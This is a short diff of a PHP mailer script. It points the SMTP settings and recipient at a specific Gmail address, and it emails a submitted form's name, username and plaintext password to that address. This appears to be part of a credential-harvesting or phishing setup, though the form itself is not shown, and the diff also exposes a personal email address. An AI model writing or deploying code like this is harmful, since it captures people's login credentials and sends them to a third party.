@@ -11,12 +11,12 @@ if(isset($_POST['submit'])){
   $mail->SMTPAuth   = TRUE;
   $mail->SMTPSecure = "tls";
   $mail->Port       = 587;
-  $mail->Host       = "smtp.mail.host";
-  $mail->Username   = "your-mail-username";
-  $mail->Password   = "your-mail-password";
+  $mail->Host       = "smtp.gmail.com";
+  $mail->Username   = "arivu1243@gmail.com";
+  /*$mail->Password   = "your-mail-password";*/
 
   $mail->IsHTML(true);
-  $mail->AddAddress("recipient-email@domain", "recipient-name");  
+  $mail->AddAddress("arivu1243@gmail.com", "recipient-name");  
   $mail->SetFrom($name, "from-name");
   $mail->Subject = "Test is Test Email sent via Gmail SMTP Server using PHP Mailer";
   $content = "From: $name \n Message: \n Username:$username Password:$password";
